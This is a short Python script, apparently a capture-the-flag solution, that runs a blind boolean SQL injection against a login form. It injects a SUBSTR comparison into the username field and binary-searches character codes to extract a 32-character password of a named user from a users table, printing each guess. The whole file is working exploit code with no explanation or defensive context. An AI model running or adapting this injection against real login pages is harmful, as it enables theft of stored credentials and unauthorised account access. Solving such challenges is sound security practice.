import requests
import uuid


def check(payload):
    url = 'https://cool.mc.ax/'
    params = {'username': payload, 'password': 'lorsekudos'}
    r = requests.post(url, data=params)
    # print(r.text)
    if 'logged in' in r.text:
        return True
    else:
        return False


password = ''
for i in range(32):
    index = i + 1
    low, high = 0, 127
    while(True):
        mid = (low + high) // 2
        char = chr(mid)

        if abs(high - low) <= 1:
            password += char
            print(password)
            break
        sql = f"lorse' AND SUBSTR((SELECT password FROM users WHERE username='ginkoid'), {index}, 1) < '{char}';-- "

        print(sql)
        if check(sql):
            high = mid
        else:
            low = mid
